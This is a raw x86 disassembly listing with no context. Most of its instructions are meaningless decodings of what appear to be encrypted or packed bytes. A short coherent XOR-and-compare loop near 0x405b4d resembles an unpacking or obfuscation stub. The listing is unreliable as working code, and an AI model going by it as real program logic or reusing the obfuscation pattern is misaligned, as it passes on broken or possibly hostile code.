  4059c7:	mov    WORD PTR [eax-0x2a],?
  4059ca:	cmp    DWORD PTR [ebx+0x18],0xffffffcb
  4059ce:	repz jne 0x4059d2
  4059d1:	or     eax,0xec7bb5a2
  4059d6:	call   0x639f9aba
  4059db:	sub    ebx,ebx
  4059dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059de:	inc    ebx
  4059df:	xor    BYTE PTR [ebx-0x3e],bh
  4059e2:	pop    ss
  4059e3:	cli    
  4059e4:	push   ebx
  4059e5:	xlat   BYTE PTR ds:[ebx]
  4059e6:	pop    esi
  4059e7:	and    eax,0xf172e436
  4059ec:	jmp    0x405a09
  4059ee:	jecxz  0x405a0f
  4059f0:	inc    ecx
  4059f1:	jbe    0x40599e
  4059f3:	aaa    
  4059f4:	mov    WORD PTR [ebx+0x56],?
  4059f7:	int    0x8b
  4059f9:	dec    esp
  4059fa:	fcomp  DWORD PTR [ebx]
  4059fc:	daa    
  4059fd:	shl    dh,0x6c
  405a00:	movzx  ecx,BYTE PTR [esi]
  405a03:	jmp    0x405996
  405a05:	xchg   DWORD PTR [ebx+ebp*2],eax
  405a08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a09:	dec    edi
  405a0a:	inc    ebx
  405a0b:	dec    DWORD PTR [ebx+0x41573dc1]
  405a11:	imul   ebx,DWORD PTR [edx+0x16],0x998c27ed
  405a18:	mov    al,0x6f
  405a1a:	test   BYTE PTR [ebx+0x5],cl
  405a1d:	inc    esp
  405a1e:	sbb    eax,0x393a374a
  405a23:	enter  0xfbfd,0x23
  405a27:	das    
  405a28:	int3   
  405a29:	mov    ecx,0x59eaf2d1
  405a2e:	mov    eax,0x50086a9
  405a33:	test   al,0x58
  405a35:	(bad)  
  405a36:	lahf   
  405a37:	sub    bh,dh
  405a39:	cdq    
  405a3a:	add    eax,0x899498b1
  405a3f:	adc    DWORD PTR [ecx-0x36],ebx
  405a42:	push   ebx
  405a43:	mov    edx,0x435cc579
  405a48:	dec    edi
  405a49:	and    edx,DWORD PTR [edi-0x710d68bc]
  405a4f:	mov    BYTE PTR [edi],al
  405a51:	scas   eax,DWORD PTR es:[edi]
  405a52:	push   ecx
  405a53:	adc    edx,esi
  405a55:	push   esi
  405a56:	xchg   esi,eax
  405a57:	pop    ebp
  405a58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a59:	xchg   ebx,eax
  405a5a:	and    edx,esp
  405a5c:	add    dl,cl
  405a5e:	std    
  405a5f:	inc    ebp
  405a60:	jmp    0x405abf
  405a62:	popf   
  405a63:	jb     0x405a45
  405a65:	je     0x4059eb
  405a67:	xor    al,BYTE PTR [ebp+0x0]
  405a6a:	pop    ss
  405a6b:	push   edi
  405a6c:	(bad)  
  405a6d:	adc    al,0xd5
  405a6f:	(bad)  
  405a71:	mov    dl,0xb7
  405a73:	cmp    al,0x63
  405a75:	ret    
  405a76:	retf   0xc15e
  405a79:	jnp    0x405a18
  405a7b:	ins    BYTE PTR es:[edi],dx
  405a7c:	push   0xc07b5762
  405a81:	popa   
  405a82:	inc    edi
  405a83:	scas   eax,DWORD PTR es:[edi]
  405a84:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  405a86:	jp     0x405a5c
  405a88:	and    DWORD PTR [ebx],edi
  405a8a:	out    0x1b,al
  405a8c:	daa    
  405a8d:	ret    0xf6fc
  405a90:	pop    ecx
  405a91:	pusha  
  405a92:	mov    ah,0xc
  405a94:	push   es
  405a95:	xchg   eax,ecx
  405a97:	mov    ss,edi
  405a99:	aad    0x96
  405a9b:	popf   
  405a9c:	mov    al,0xd1
  405a9e:	pop    esi
  405a9f:	mov    ebp,0x7e712a64
  405aa4:	cdq    
  405aa5:	sbb    dl,cl
  405aa7:	xor    BYTE PTR [ecx+0x24],dl
  405aaa:	stos   BYTE PTR es:[edi],al
  405aab:	(bad)  
  405aac:	mov    edi,0xd5dfc9f5
  405ab1:	pop    edi
  405ab2:	ficomp DWORD PTR [ecx-0x13a12960]
  405ab8:	push   0x68
  405aba:	add    eax,0x5dae9233
  405abf:	dec    esi
  405ac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ac1:	pop    edi
  405ac2:	xchg   edx,eax
  405ac3:	add    bl,al
  405ac5:	mov    bl,0xd2
  405ac7:	sbb    eax,0x63303edf
  405acc:	push   edx
  405acd:	repz sbb al,0x16
  405ad0:	cld    
  405ad1:	cs leave 
  405ad3:	cld    
  405ad4:	loope  0x405acb
  405ad6:	cmp    BYTE PTR [eax-0x18283b26],ah
  405adc:	lock (bad) 
  405ade:	xor    DWORD PTR [edi],0xf8a5d654
  405ae4:	cdq    
  405ae5:	sbb    edi,ebx
  405ae7:	cdq    
  405ae8:	mov    dh,0x53
  405aea:	push   esp
  405aeb:	jbe    0x405b5c
  405aed:	xchg   ecx,eax
  405aee:	push   0x8de2940
  405af3:	lods   eax,DWORD PTR ds:[esi]
  405af4:	mov    eax,cs
  405af6:	add    al,ch
  405af8:	fcomp  DWORD PTR [edx+0x30]
  405afb:	in     al,0x69
  405afd:	(bad)  
  405afe:	adc    eax,0x3f149a62
  405b03:	push   edi
  405b04:	scas   eax,DWORD PTR es:[edi]
  405b05:	pop    ds
  405b06:	dec    ebp
  405b07:	or     BYTE PTR [ecx+0x47],bl
  405b0a:	mov    WORD PTR [edi-0x3c],fs
  405b0d:	mov    ecx,0xff061006
  405b12:	std    
  405b13:	addr16 sti 
  405b15:	push   eax
  405b16:	mov    dl,0xba
  405b18:	jmp    0xd0a05392
  405b1d:	dec    esp
  405b1e:	popf   
  405b1f:	sub    eax,0xca9b2c91
  405b24:	mov    esp,0xc749c2c3
  405b29:	add    bh,BYTE PTR [edx+eax*8]
  405b2c:	mov    dl,0x2f
  405b2e:	adc    esp,ecx
  405b30:	fisttp WORD PTR ds:0xb9104d89
  405b36:	ins    DWORD PTR es:[edi],dx
  405b37:	or     al,0x0
  405b39:	add    bh,al
  405b3b:	inc    ebp
  405b3c:	or     BYTE PTR [ebp-0x38f0cb32],bh
  405b42:	inc    ebp
  405b43:	cld    
  405b44:	test   DWORD PTR ds:[eax+edi*8-0x637acd47],ebx
  405b4c:	clc    
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43371b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x4336d3,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x433723,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x43376f,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x4337af,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0x41cdf1c4
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405bb2
  405be0:	fisttp DWORD PTR [esi+0x72c4ab48]
  405be6:	je     0x405b99
  405be8:	mov    ebx,0xc96a2397
  405bed:	popa   
  405bee:	and    BYTE PTR [ebp+0x5048223f],al
  405bf4:	xchg   edi,eax
  405bf5:	inc    esp
  405bf6:	mov    ah,0x92
  405bf8:	mov    edi,0x970e4f02
  405bfd:	fwait
  405bfe:	lds    edx,FWORD PTR [esi-0x6c53d168]
  405c04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c05:	test   DWORD PTR [esi+0x39],0x3f1564a1
  405c0c:	fsub   DWORD PTR [edx]
  405c0e:	push   ss
  405c0f:	dec    ebp
  405c10:	cld    
  405c11:	cmp    al,0x49
  405c13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c14:	(bad)  
  405c15:	jg     0x405c2b
  405c17:	xor    ch,bh
  405c19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c1a:	mov    esi,0xf69b8d65
  405c1f:	mov    dl,0x58
  405c21:	adc    BYTE PTR [ebx],0x3
  405c24:	cli    
  405c25:	in     al,0x1c
  405c27:	cdq    
  405c28:	hlt    
  405c29:	and    eax,0x894d81be
  405c2e:	sub    eax,0x13519c97
  405c33:	fnstcw WORD PTR [esi+0x11ce245b]
  405c39:	push   esi
  405c3a:	push   ebx
  405c3b:	fistp  DWORD PTR es:[edi+edi*2]
  405c3f:	out    0xa4,eax
  405c41:	mov    ?,WORD PTR [eax+edx*2-0x29]
  405c45:	xlat   BYTE PTR ds:[ebx]
  405c46:	frstor [ecx+0x52b1b28d]
  405c4c:	xchg   sp,ax
  405c4e:	cmp    al,BYTE PTR [edi-0x48d686b4]
  405c54:	(bad)  
  405c55:	pop    esp
  405c56:	int3   
  405c57:	fld    TBYTE PTR [ebx-0x73eaa194]
  405c5d:	pusha  
  405c5e:	mov    esi,0x5648f309
  405c63:	push   edi
  405c64:	xchg   esi,eax
  405c65:	dec    eax
  405c66:	aas    
  405c67:	cld    
  405c68:	call   0x361a:0x5909e4f9
  405c6f:	jnp    0x405c90
  405c71:	das    
  405c72:	es jbe 0x405cac
  405c75:	cmc    
  405c76:	dec    edi
  405c77:	jae    0x405bfd
  405c79:	sbb    eax,0x9eaaba45
  405c7e:	jo     0x405cba
  405c80:	hlt    
  405c81:	dec    esi
  405c82:	and    BYTE PTR [ecx],dl
  405c84:	out    0x59,al
  405c86:	mov    esp,0xfeca3be3
  405c8b:	mov    ch,0xa2
  405c8d:	imul   esp,DWORD PTR ds:0x5e5f97a6,0x21a99b0a
  405c97:	scas   al,BYTE PTR es:[edi]
  405c98:	pop    ecx
  405c99:	fst    DWORD PTR [edx-0x6a]
  405c9c:	fwait
  405c9d:	(bad)  
  405c9e:	mov    ds:0x6c7c3e6b,eax
  405ca3:	or     ah,BYTE PTR [ecx]
  405ca5:	inc    edi
  405ca7:	daa    
  405ca8:	pushf  
  405ca9:	mov    ebx,0x3f9062e8
  405cae:	aas    
  405caf:	push   0x46
  405cb1:	mov    ds:0xa447ca19,al
  405cb6:	retf   
  405cb7:	lea    ebx,[eax+edx*1+0x2e8cbce0]
  405cbe:	jmp    0x6af90b3a
  405cc3:	lahf   
  405cc4:	les    ebp,FWORD PTR ds:0xfa8f71e6
  405cca:	repnz idiv DWORD PTR [ecx+0xc]
  405cce:	jecxz  0x405c65
  405cd0:	das    
  405cd1:	xchg   BYTE PTR [ebp-0x79],dl
  405cd4:	cmp    DWORD PTR [ecx+0x39],esi
  405cd7:	sub    BYTE PTR [eax],al
  405cd9:	jmp    0x6a21:0x801d9d2c
  405ce0:	push   ebx
  405ce1:	jmp    0x405d3a
  405ce3:	adc    eax,0xe451dedf
  405ce8:	lea    esp,[edx-0x3d]
  405ceb:	out    0x9f,al
  405ced:	leave  
  405cee:	cmp    eax,0x88c08f96
  405cf3:	or     BYTE PTR [edi+esi*1-0x5f53f7df],cl
  405cfa:	and    edi,ebp
  405cfc:	test   eax,0xfcf4133
  405d01:	xchg   ebx,eax
  405d03:	and    al,0xb5
  405d05:	xor    esp,DWORD PTR [ecx+0x192fe76e]
  405d0b:	xchg   esp,ebp
  405d0d:	add    eax,0xcfa702f5
  405d12:	xchg   esp,eax
  405d13:	fwait
  405d14:	adc    bl,BYTE PTR [esi]
  405d16:	cmc    
  405d17:	aaa    
  405d18:	fwait
  405d19:	rcr    BYTE PTR [ebx+esi*4+0x2c],0x44
  405d1e:	xor    al,0xcd
  405d20:	mov    ebp,0x767829a
  405d25:	pusha  
  405d26:	lahf   
  405d27:	data16 stos BYTE PTR es:[edi],al
  405d29:	dec    edx
  405d2a:	mov    eax,ds:0xfc82bfc3
  405d2f:	mov    ds:0xe516cd5,eax
  405d34:	pop    edx
  405d35:	cmp    al,0x99
  405d37:	call   0xfaf8d36b
  405d3c:	fild   WORD PTR [ebx-0x62]
  405d3f:	addr16 push ds
  405d41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d42:	ret    
  405d43:	push   ds
  405d44:	inc    ebp
  405d45:	fld    TBYTE PTR es:[esp+ebx*4-0x25fa03c4]
  405d4d:	loopne 0x405d95
  405d4f:	popa   
  405d50:	add    eax,0x1fca39c1
  405d55:	adc    eax,0xee1f5420
  405d5a:	pop    ds
  405d5b:	sub    ecx,DWORD PTR [ebx]
  405d5d:	into   
  405d5e:	aas    
  405d5f:	test   al,0xa
  405d61:	mov    edi,0xbf458b7b
  405d66:	(bad)  
  405d68:	daa    
  405d69:	adc    eax,0xe4837348
  405d6e:	add    BYTE PTR [edi],ch
  405d70:	mov    esi,0xb206d471
  405d75:	xor    ebx,DWORD PTR [edx+0x6cd186d2]
  405d7b:	jnp    0x405d03
  405d7d:	push   esi
  405d7e:	mov    esi,0x2ea13c23
  405d83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d84:	inc    esi
  405d85:	push   ds
  405d86:	xchg   BYTE PTR [edi+0x3333afef],ch
  405d8c:	add    DWORD PTR [esi],esp
  405d8e:	jmp    0xae23cd1c
  405d93:	sub    DWORD PTR [ecx+0x9],ecx
  405d96:	mov    dl,0xc3
  405d98:	add    eax,0x7cbff6e0
  405d9d:	push   ebp
  405d9e:	xchg   DWORD PTR [ecx+edi*1-0x16458c8e],esi
  405da5:	xor    BYTE PTR [esi],dl
  405da7:	pusha  
  405da8:	sub    DWORD PTR [esi-0x2c062ca4],eax
  405dae:	mov    bl,0xe2
  405db0:	mov    edi,0x87580dd7
  405db5:	push   ss
  405db6:	jp     0x405de9
  405db8:	mov    WORD PTR [ecx+0x25],fs
  405dbb:	push   ecx
  405dbc:	mov    eax,ds:0x47da5435
  405dc1:	mov    ds:0xcf34cdc6,al
  405dc6:	loop   0x405e12
  405dc8:	lds    ecx,FWORD PTR [ebx-0x584521da]
  405dce:	add    dl,0xee
  405dd1:	pop    ds
  405dd2:	add    al,BYTE PTR [esi+esi*2-0x65]
  405dd6:	stos   DWORD PTR es:[edi],eax
  405dd7:	sub    BYTE PTR [eax+edx*2+0x72],bh
  405ddb:	push   esi
  405ddc:	pop    esp
  405ddd:	adc    esp,DWORD PTR [esi+edi*4]
  405de0:	daa    
  405de1:	sti    
  405de2:	lds    esi,FWORD PTR [edx]
  405de4:	jmp    0x1461:0x80395c90
  405deb:	mov    esi,0x15197765
  405df0:	push   esi
  405df1:	ins    BYTE PTR es:[edi],dx
  405df2:	push   es
  405df3:	ror    DWORD PTR [edi-0x2f32ee97],cl
  405df9:	in     eax,0xe8
  405dfb:	inc    ebp
  405dfc:	inc    edx
  405dfd:	rol    BYTE PTR [esi+0x35],cl
  405e00:	pop    esi
  405e01:	(bad)  
  405e02:	aas    
  405e03:	ins    DWORD PTR es:[edi],dx
  405e04:	mov    ds:0x9a28b80e,al
  405e09:	mov    ch,0xcd
  405e0b:	adc    BYTE PTR [ebx+ecx*2-0x17],0x35
  405e10:	mov    DWORD PTR [ebx],eax
  405e12:	xchg   esi,eax
  405e13:	xor    ecx,DWORD PTR [esi]
  405e15:	lods   al,BYTE PTR ds:[esi]
  405e16:	mov    edx,0xaa89ca92
  405e1b:	jne    0x405e85
  405e1d:	das    
  405e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e20:	fnstenv [ebx]
  405e22:	and    esp,esi
  405e24:	clc    
  405e25:	ins    DWORD PTR es:[edi],dx
  405e26:	mov    esi,0x123a6b21
  405e2b:	sbb    ebx,edi
  405e2d:	mov    DWORD PTR [ecx-0x3d],esp
  405e30:	fistp  DWORD PTR [ecx-0x8]
  405e33:	and    esi,DWORD PTR [esi]
  405e35:	jo     0x405e5e
  405e37:	xor    eax,0x552af14
  405e3c:	xchg   esp,eax
  405e3e:	jge    0x405e1b
  405e40:	inc    eax
  405e41:	pop    es
  405e42:	test   al,0xa5
  405e44:	repz (bad) 
  405e47:	lock bound eax,QWORD PTR [edx+0x49]
  405e4b:	push   ebp
  405e4c:	out    dx,al
  405e4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e4e:	xor    eax,0xb968711a
  405e53:	add    al,0x4
  405e55:	jno    0x405e61
  405e57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e58:	mov    WORD PTR [ebp-0x39],?
  405e5b:	pusha  
  405e5c:	dec    esi
  405e5d:	lds    edi,FWORD PTR [edx-0x7c]
  405e60:	iret   
  405e61:	into   
  405e62:	aam    0x12
  405e64:	int3   
  405e65:	mov    ds,WORD PTR [esi+0x255dfe62]
  405e6b:	loope  0x405e7d
  405e6d:	loopne 0x405e7f
  405e6f:	push   ebx
  405e70:	(bad)  
  405e71:	push   esi
  405e72:	inc    BYTE PTR [ebx-0x7b1f15ec]
  405e78:	imul   esi,DWORD PTR [esi+ebp*8],0x90a9f05f
  405e7f:	data16 mov al,ds:0xf4394e86
  405e85:	jl     0x405ea9
  405e87:	mov    cl,0x0
  405e89:	loope  0x405eff
  405e8b:	jp     0x405eea
  405e8d:	mov    edi,esi
  405e8f:	clts   
  405e91:	sahf   
  405e92:	adc    BYTE PTR [esi+edx*4],dl
  405e95:	outs   dx,DWORD PTR ds:[esi]
  405e96:	inc    edi
  405e97:	and    edx,DWORD PTR [eax-0x67]
  405e9a:	loop   0x405ef5
  405e9c:	inc    esp
  405e9d:	mov    ecx,0xdb962ded
  405ea2:	add    DWORD PTR [esp+eax*2],esp
  405ea5:	out    0x1b,eax
  405ea7:	sub    ch,BYTE PTR [edx+0x5d88db10]
  405ead:	ins    DWORD PTR es:[edi],dx
  405eae:	xchg   edi,eax
  405eaf:	mov    ebx,DWORD PTR [ecx]
  405eb1:	(bad)  
  405eb2:	jnp    0x405ee7
  405eb4:	stc    
  405eb5:	add    esp,ebx
  405eb7:	data16 jp 0x405f36
  405eba:	mov    dh,0x8
  405ebc:	sbb    BYTE PTR [edx],bh
  405ebe:	retf   
  405ebf:	sub    al,0x2a
  405ec1:	mov    ecx,0xf994f7d4
  405ec6:	fstp   QWORD PTR [eax-0x47]
  405ec9:	adc    esp,DWORD PTR [edx]
  405ecb:	and    esi,ecx
  405ecd:	mov    esp,0xe67f7870
  405ed2:	cmc    
  405ed3:	lea    ebp,[eax+0x15]
  405ed6:	push   0x62197097
  405edb:	out    0xd5,eax
  405edd:	pop    es
  405ede:	sbb    BYTE PTR [esi+0x75],ah
  405ee1:	in     eax,dx
  405ee2:	fwait
  405ee3:	cmc    
  405ee4:	stc    
  405ee5:	mov    esp,0x4d8d53b9
  405eea:	mov    cl,0x6b
  405eec:	add    BYTE PTR [esi+0x14f77bfc],0x2b
  405ef3:	xchg   edx,eax
  405ef4:	scas   al,BYTE PTR es:[edi]
  405ef5:	mov    esp,0x1595a2cb
  405efa:	dec    ecx
  405efb:	push   cs
  405efc:	pop    eax
  405efd:	mov    bl,0xb0
  405eff:	das    
  405f00:	dec    esi
  405f01:	jle    0x405f77
  405f03:	or     ebp,DWORD PTR [eax-0x7c]
  405f06:	dec    ebx
  405f07:	inc    edi
  405f08:	jbe    0x405f86
  405f0a:	inc    esp
  405f0b:	jl     0x405ea2
  405f0d:	add    eax,0x33c313c0
  405f12:	icebp  
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    ecx,es
  405f27:	dec    esi
  405f28:	push   ds
  405f29:	fsub   QWORD PTR [esi+0x2c7e7e30]
  405f2f:	jge    0x405faf
  405f31:	jle    0x405fb1
  405f33:	dec    esi
  405f34:	add    al,0x33
  405f36:	clc    
  405f37:	adc    eax,0x943c74f6
  405f3c:	add    eax,0x476aa880
  405f41:	push   ebx
  405f42:	stos   DWORD PTR es:[edi],eax
  405f43:	(bad)
  405f47:	sbb    ch,BYTE PTR [eax-0x48]
  405f4a:	jge    0x405f73
  405f4c:	xor    ch,BYTE PTR [ebp+0x27]
  405f4f:	inc    eax
  405f50:	enter  0x5a30,0xd3
  405f54:	iret   
  405f55:	das    
  405f56:	inc    BYTE PTR [edx+0x67bd3933]
  405f5c:	je     0x405f54
  405f5e:	(bad)  
  405f5f:	jle    0x405f7d
  405f61:	stc    
  405f62:	xor    DWORD PTR [ebp+0x4af8e3d1],eax
  405f68:	jecxz  0x405f2a
  405f6a:	icebp  
  405f6b:	lods   eax,DWORD PTR ds:[esi]
  405f6c:	mov    ebx,0x53bd6a5d
  405f71:	dec    eax
  405f72:	cs out dx,al
  405f74:	inc    esp
  405f76:	pop    ds
  405f77:	mov    eax,0xe0ef2435
  405f7c:	jl     0x405f43
  405f7e:	push   0xc16b7a25
  405f83:	xchg   dl,ah
  405f85:	js     0x405f67
  405f87:	or     esp,0x41eeebca
  405f8d:	stos   BYTE PTR es:[edi],al
  405f8e:	(bad)  
  405f8f:	fsub   QWORD PTR [edi]
  405f91:	or     eax,0xc7c20914
  405f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f97:	cli    
  405f98:	scas   al,BYTE PTR es:[edi]
  405f99:	fnsave [ecx+0x129bd53e]
  405f9f:	(bad)  
  405fa0:	and    al,0x32
  405fa2:	jecxz  0x406022
  405fa4:	cmp    dl,ah
  405fa6:	shl    BYTE PTR [eax-0x7425a80a],0xb5
  405fad:	sbb    eax,0xebfbfeae
  405fb2:	(bad)
  405fb6:	inc    ebx
  405fb7:	rol    BYTE PTR [edx+0x5a7e2513],1
  405fbd:	inc    esp
  405fbe:	addr16 mov bh,0x32
  405fc1:	fcomp  st(1)
  405fc3:	sub    al,0x17
  405fc5:	ss (bad) 
  405fc7:	ds out 0xfd,eax
  405fca:	lock (bad) 
  405fcc:	sub    cl,BYTE PTR [ebp+0x5202da89]
  405fd2:	loopne 0x40604d
  405fd4:	out    dx,eax
  405fd5:	cmp    DWORD PTR [ebx],ecx
  405fd7:	sahf   
  405fd8:	lods   al,BYTE PTR ds:[esi]
  405fd9:	cmp    al,0xb7
  405fdb:	loopne 0x405f77
  405fdd:	jmp    0x405f71
  405fdf:	xchg   esi,eax
  405fe0:	cmp    eax,0xbb0a76f5
  405fe5:	mov    ch,0xe5
  405fe7:	lea    ebx,[ebx-0x69]
  405fea:	xchg   dh,cl
  405fec:	outs   dx,BYTE PTR ds:[esi]
  405fed:	add    ebp,DWORD PTR [eax-0x5ce7b70c]
  405ff3:	stc    
  405ff4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ff5:	arpl   WORD PTR [edx],ax
  405ff7:	inc    esp
  405ff8:	mov    WORD PTR [eax],ds
  405ffa:	or     BYTE PTR [ebp+0x6c4cd615],dl
  406000:	sbb    BYTE PTR fs:[ecx+0x21],dl
  406004:	add    ah,BYTE PTR [edx-0x77828c5d]
  40600a:	cmp    al,0x8f
  40600c:	adc    ebp,DWORD PTR [eax]
  40600e:	jns    0x405f95
  406010:	jl     0x405fcb
  406012:	mov    esp,0x60f98ad2
  406017:	add    BYTE PTR [ebp+0x52],dl
  40601a:	les    edx,FWORD PTR [edi]
  40601c:	mov    dh,0x89
  40601e:	mov    ds:0x286a0185,al
  406023:	xor    DWORD PTR ss:[ecx+0x2870ad1c],esi
  40602a:	mov    bl,0x9d
  40602c:	xchg   esi,eax
  40602d:	sahf   
  40602e:	das    
  40602f:	(bad)  
  406032:	or     ecx,DWORD PTR [ecx]
  406034:	inc    edx
  406035:	fwait
  406036:	xor    al,0xbe
  406038:	mov    cl,0x44
  40603a:	push   ss
  40603b:	push   cs
  40603c:	push   es
  40603d:	jmp    0x620754a3
  406042:	and    DWORD PTR ds:[eax-0x35a46082],edi
  406049:	push   ebx
  40604a:	xchg   ecx,eax
  40604b:	shl    DWORD PTR [ecx+0x26],1
  40604e:	popf   
  40604f:	jb     0x40606f
  406051:	xchg   edx,eax
  406052:	lods   al,BYTE PTR ds:[esi]
  406053:	jecxz  0x405ff4
  406055:	sub    ah,cl
  406057:	rcl    BYTE PTR [edx+eiz*2-0x42],0xe8
  40605c:	call   0x660dacef
  406061:	cmp    al,0x40
  406063:	xor    DWORD PTR [esp+esi*1-0x265bf2e9],ebx
  40606a:	add    BYTE PTR [eax+0x3befbdcb],0x31
  406071:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406072:	adc    al,BYTE PTR [edx+0x5716a4b4]
  406078:	scas   eax,DWORD PTR es:[edi]
  406079:	fcompp 
  40607b:	xchg   ebx,eax
  40607c:	mov    cl,dl
  40607e:	and    bl,cl
  406080:	pop    edx
  406081:	jmp    0x5ac44d94
  406086:	adc    dl,ch
  406088:	inc    ecx
  406089:	dec    ebx
  40608a:	loop   0x4060ad
  40608c:	(bad)  
  40608d:	pusha  
  40608e:	jnp    0x406052
  406090:	sti    
  406091:	jmp    0x4060d0
  406093:	xchg   edx,eax
  406094:	imul   ebx
  406096:	or     ebx,DWORD PTR [ebp+0x478804f9]
  40609c:	(bad)  
  40609d:	icebp  
  40609e:	pushf  
  40609f:	pop    edx
  4060a0:	sbb    ch,cl
  4060a2:	cmp    al,BYTE PTR [esi+eax*2]
  4060a5:	jno    0x406073
  4060a7:	mov    ah,BYTE PTR [edx]
  4060a9:	inc    eax
  4060aa:	adc    eax,DWORD PTR [edi-0x35]
  4060ad:	fidiv  WORD PTR [edx]
  4060af:	jne    0x406083
  4060b1:	cmp    edx,ebp
  4060b3:	mov    esp,0xaa4d71dc
  4060b8:	fadd   st(2),st
  4060ba:	inc    ebx
  4060bb:	jns    0x40604f
  4060bd:	dec    ebp
  4060be:	pminub mm2,QWORD PTR [ebx]
  4060c1:	ins    BYTE PTR es:[edi],dx
  4060c2:	(bad)  
  4060c3:	das    
  4060c4:	das    
  4060c5:	xor    al,0x7d
  4060c7:	(bad)  
  4060c8:	sar    BYTE PTR [ecx],0xd4
  4060cb:	cld    
  4060cc:	adc    al,0x4d
  4060ce:	jbe    0x40610b
  4060d0:	fmul   QWORD PTR [esi+0x43ea377a]
  4060d6:	lea    ebx,ds:0x10e5fa16
  4060dc:	(bad)  
  4060dd:	repz or eax,0x22674dc
  4060e3:	lds    edi,FWORD PTR [esi+0x42]
  4060e6:	pusha  
  4060e7:	mov    esi,gs
  4060e9:	popa   
  4060ea:	pop    ebx
  4060eb:	adc    dh,ch
  4060ed:	inc    esi
  4060ee:	sub    esp,DWORD PTR [ecx]
  4060f0:	je     0x4060c6
  4060f2:	sbb    edi,DWORD PTR [eax]
  4060f4:	enter  0x7a7,0xc0
  4060f8:	(bad)  
  4060f9:	push   edi
  4060fa:	inc    ebp
  4060fb:	inc    eax
  4060fc:	jbe    0x406169
  4060fe:	inc    ebp
  4060ff:	or     DWORD PTR [edx],ebx
  406101:	xor    ah,bl
  406103:	(bad)  
  406104:	mov    ecx,DWORD PTR [eax-0x4]
  406107:	sbb    eax,0x90aec733
  40610c:	cmp    edi,DWORD PTR [ecx+0x50ed4fdf]
  406112:	jae    0x406183
  406114:	sub    esi,esi
  406116:	cmp    al,0xf4
  406118:	lahf   
  406119:	sbb    eax,0x1e4d7e35
  40611e:	jns    0x406149
  406120:	mov    edx,0xb0c961a0
  406125:	jb     0x406161
  406127:	push   0xefb5669
  40612c:	sub    al,0xc8
  40612e:	jae    0x4060bf
  406130:	leave  
  406131:	inc    esp
  406132:	pop    ecx
  406133:	mov    al,0xa
  406135:	push   edi
  406136:	adc    BYTE PTR [edx],al
  406138:	mov    ebx,0xe10f79fd
  40613d:	fwait
  40613e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40613f:	pop    ecx
  406140:	call   0xd38ccb93
  406145:	into   
  406146:	cwde   
  406147:	mov    dh,0x51
  406149:	add    BYTE PTR [esi-0x1dcff4cf],0x66
  406150:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406151:	mov    bh,0xc2
  406153:	push   edi
  406154:	js     0x4061c0
  406156:	fisubr DWORD PTR [eax+0x62]
  406159:	ret    
  40615a:	jae    0x40616c
  40615c:	dec    ecx
  40615d:	sub    al,BYTE PTR [edi]
  40615f:	fisttp DWORD PTR [ebx-0x1e]
  406162:	or     ebx,edx
  406164:	aad    0x4
  406166:	sahf   
  406167:	(bad)  
  406168:	jbe    0x40617e
  40616a:	add    bh,ch
  40616c:	mov    esp,ds
  40616e:	or     eax,0x14d5e6ea
  406173:	fisttp DWORD PTR [edi+ebp*1-0x4304ceda]
  40617a:	inc    ebp
  40617b:	in     al,0x60
  40617d:	jecxz  0x406164
  40617f:	or     DWORD PTR [edi+edi*2-0x25d53ae8],0x52fc39e8
  40618a:	je     0x406149
  40618c:	repnz inc esi
  40618e:	jno    0x406137
  406190:	xchg   ebp,eax
  406191:	sbb    al,0x4
  406193:	xor    DWORD PTR [esi-0x3f16c307],edi
  406199:	or     esi,esp
  40619b:	shr    DWORD PTR ds:0x93845f1e,0xc6
  4061a2:	and    ah,bl
  4061a4:	pop    ebx
  4061a5:	cmc    
  4061a6:	hlt    
  4061a7:	push   edx
  4061a8:	int3   
  4061a9:	popf   
